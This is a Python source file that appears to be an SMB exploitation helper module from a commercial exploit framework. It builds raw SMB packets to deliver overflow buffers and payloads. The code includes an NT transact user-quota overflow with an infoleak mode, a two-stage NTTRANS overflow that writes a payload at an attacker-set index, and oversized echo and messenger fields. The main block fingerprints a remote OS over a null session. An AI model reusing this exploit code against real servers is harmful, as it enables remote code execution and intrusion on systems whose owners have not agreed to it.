#! /usr/bin/env python


import smb
import nmb
import struct
import os
import string
from exploitutils import backwardsunistring

TRANSACT2_OPEN = "\x00\x00"
NTTRANSCREATE = "\x00\x01"
NT_TRANSACT_GET_USER_QUOTA = "\x00\x07"
TRANSACT_GET_USER_QUOTA_FOR_SID = 0x0101

NTCREATEX = 0xa2
NTTRANS = 0xa0
SENDS = 0xd0
SENDSTART = 0xd5
ECHO = 0x2b
FLAGS2_LONG_FILENAME = 0x0001
DESIRED_ACCESS_PIPE = 0x2019f
FILE_SHARE_READ = 1
FILE_SHARE_WRITE = 2
FILE_OPEN = 1

class SAMBAException(Exception):
    
    def __init__(self, args=None):
        self.args = args
        
    def __str__(self):
        return `self.args`


class SAMBAClient:
    
    def __init__(self):
        pass
    
    def do_smb_echo(self):
        wordcount = 0xff & ~0x1
        params = ''
        data = "\xff"*400
        self.remote._SMB__send_smb_packet_mod(ECHO, 0, self.remote._SMB__is_pathcaseless,\
                                          FLAGS2_LONG_FILENAME, self.tid, 0, wordcount,\
                                          '',\
                                          data)
    def do_smb_sendstrt(self):
        myname = "NOIR"
        yourhost = "b"*20 + "\x00"
        self.remote._SMB__send_smb_packet(SENDSTART, 0, 0, 0, 0, 0, '',\
                struct.pack("b"+str(len(myname))+"sb"+str(len(yourhost))+"s", 4, myname, 4, yourhost))
        
    def do_smb_sends(self):
        myhost = "a"*30 + "\x00"
        yourhost = "b"*20 + "\x00"
        msg = "a"*20+"\n"
        lenmsg = len(msg) #change as you wish

        self.remote._SMB__send_smb_packet(SENDS, 0, 0, 0, 0, 0, '',\
                struct.pack("b"+str(len(myhost))+"sb"+str(len(yourhost))+"sb",\
                            4, myhost, 4, yourhost, 1) +\
                                              struct.pack("<H"+str(len(msg))+"s", lenmsg, msg) )
        
    def do_smb_connect_share(self, target, user, password, share):
        
        self.remote = smb.SMB("*SMBSERVER", target)
        self.remote.login(user, password, "LOCALHOST")
        self.tid = self.remote._SMB__connect_tree("\\\\" + target.upper() + "\\" + share.upper(), smb.SERVICE_ANY, None)

    def do_smb_nttrans_quota_exp(self, expbuf, payload, infoleak=0):
        
        lexpbuf = len(expbuf)
        if (lexpbuf/4) > 0xff:
            raise SAMBAException, "expbuf can not be bigger than 255*4 bytes."
        
        f = "\$Extend\$Quota:$Q:$INDEX_ALLOCATION"
        filename = backwardsunistring(f)
        
        fid = -1
        parms = struct.pack('<BBHBHLLLLLLLLLLB', 0xff, 0, 0, 0, len(filename),\
                                       0x16, 0, DESIRED_ACCESS_PIPE, 0, 0, 0, FILE_SHARE_READ|FILE_SHARE_WRITE, FILE_OPEN, 0,
                                       0x2, 0x3)
                                       
        self.remote._SMB__send_smb_packet_mod(NTCREATEX, 0, 0x08, 0xc801, self.tid,\
                               0, 48, parms+struct.pack("<H", len(filename)+3)+"\x00"+filename)
        
        while 1:
            data = self.remote._SMB__sess.recv_packet(None)
            if data:
                cmd, err_class, err_code, flags1, flags2, _, _, mid, params, d = self.remote._SMB__decode_smb(data)
                if cmd == NTCREATEX:
                    if err_class == 0x00 and err_code == 0x00:
                        fid = struct.unpack('<H', params[5:7])[0]
                        #for i in range(0, len(params)):
                            #print "%.2x" % struct.unpack('<B', params[i:i+1])[0]
                        break
                    else:
                        raise SAMBAException, 'Open file failed. (ErrClass: %d and ErrCode: %d)' % ( err_class, err_code )
        
        
        param = ""
        lexpbuf = lexpbuf & ~3
        if not infoleak:
            sid_buf = struct.pack(">BB", 1, lexpbuf/4) + "CANVAS" + expbuf[:lexpbuf]
        else:
            sid_buf = struct.pack(">BB", 1, 0xfe) + "CANVAS" + 0xfe*"A"
            
        sid_len = len(sid_buf)
        data = struct.pack("<LL", 0, sid_len) + sid_buf + payload
        setup = NT_TRANSACT_GET_USER_QUOTA
        name = ""

        #print "fid: %x" % fid
        param += struct.pack("<HHLLL", fid, TRANSACT_GET_USER_QUOTA_FOR_SID, 0x24, 0, 0x24)
        
        name_len = len(name)
        total_param_len = param_len = len(param)
        total_data_len = data_len = len(data)
        setup_len = len(setup)
        param_offset = name_len + setup_len + 73 + 3
        data_offset = param_offset + param_len
        padding = "\x00\x02\x00"
        
        #raw_input("attach")        
        self.remote._SMB__send_smb_packet(NTTRANS, 0, self.remote._SMB__is_pathcaseless, FLAGS2_LONG_FILENAME, self.tid, 0,\
                                          struct.pack('<BhLLLLLLLLBhh', 0, 0, total_param_len, total_data_len, 65504, 65504,\
                                                      param_len, param_offset, data_len, data_offset, setup_len / 2,\
                                                      struct.unpack(">h", setup)[0], 0), name + padding + param + data)

    #following two methods are for the nttrans overflow
    def do_smb_nttrans_first(self):
        
        name = ""
        param = "A"*1024
        data = ""
        setup = NTTRANSCREATE
        name = ""
                
        data_len = len(data)
        name_len = len(name)
        
        total_param_len = len(param) * 4
        total_data_len = data_len
        
        param_len = len(param)
        setup_len = len(setup)
        
        param_offset = name_len + setup_len + 63
        data_offset = param_offset + param_len
        
        self.remote._SMB__send_smb_packet(NTTRANS, 0, self.remote._SMB__is_pathcaseless, FLAGS2_LONG_FILENAME, self.tid, 0, struct.pack('<BhLLLLLLLLBhh', 19, 0, total_param_len, total_data_len, 65504, 65504, param_len, param_offset, data_len, data_offset, setup_len / 2, struct.unpack(">h", setup)[0], 0), name + param + data)
        
    def do_smb_nttrans_second(self, index, payload):
        
        name = ""
                #padding
        param = payload
        data = ""
        setup = NTTRANSCREATE
        name = ""
                
        data_len = len(data)
        name_len = len(name)
        
        total_param_len = len(param) * 4
        total_data_len = data_len
        
        param_len = len(param)
        setup_len = len(setup)

        #ovf index!
        param_disp = index
        param_offset = 72
        data_offset = 0
        data_disp = 0
        
        self.do_send_smb_packet(NTTRANS+1, 0, self.remote._SMB__is_pathcaseless, FLAGS2_LONG_FILENAME, self.tid, 0, struct.pack('<bbbbLLLLLLLLH', 0, 0, 0, 0, total_param_len, total_data_len, param_len, param_offset, param_disp, data_len, data_offset, data_disp, 0), param + data)
        
    def do_send_smb_packet(self, cmd, status, flags, flags2, tid, mid, params = '', data = ''):
        wordcount = len(params)
        #assert wordcount & 0x1 == 0        
        #print len(struct.pack('<4sBLBH12sHHHH', '\xffSMB', cmd, status, flags, flags2, '\0' * 12, tid, os.getpid(), self.remote._SMB__uid, mid) + params + struct.pack('<H', len(data)))
        
        self.remote._SMB__sess.send_packet(struct.pack('<4sBLBH12sHHHH', '\xffSMB', cmd, status, flags, flags2, '\0' * 12, tid, os.getpid(), self.remote._SMB__uid, mid) + params + struct.pack('<H', len(data)) + data)

    def do_smb_trans2(self, buf):

        self.remote._SMB__trans2(self.tid, TRANSACT2_OPEN, "\x00", buf, "\x00")
        
    def do_smb_connect(self, target, user, password):
        
        self.remote = smb.SMB("*SMBSERVER", target)
        self.remote.login(user, password)
        self.tid = self.remote._SMB__connect_tree("\\\\" + target.upper() + "\\IPC$", smb.SERVICE_ANY, None)

    def get_local_sock(self):
        return self.remote._SMB__sess._NetBIOSSession__sock.getsockname()[1]
    
    def get_sock(self):
        return self.remote._SMB__sess._NetBIOSSession__sock
    
    def get_remote_os(self):
        """
        >>> str(rem._SMB__server_os)
        'Windows 5.0'
        >>> str(rem._SMB__server_lanman)
        'Windows 2000 LAN Manager'
        """
        return self.remote._SMB__server_os
    
    def get_lanman_version(self):
        
        return self.remote._SMB__server_lanman

if __name__ == "__main__":
   import sys
   if not sys.argv[1]:
       sys.exit(0)
   
   d = SAMBAClient()
   d.__init__()
   d.do_smb_connect(sys.argv[1], "", "")
   print d.get_remote_os()
   print d.get_lanman_version()
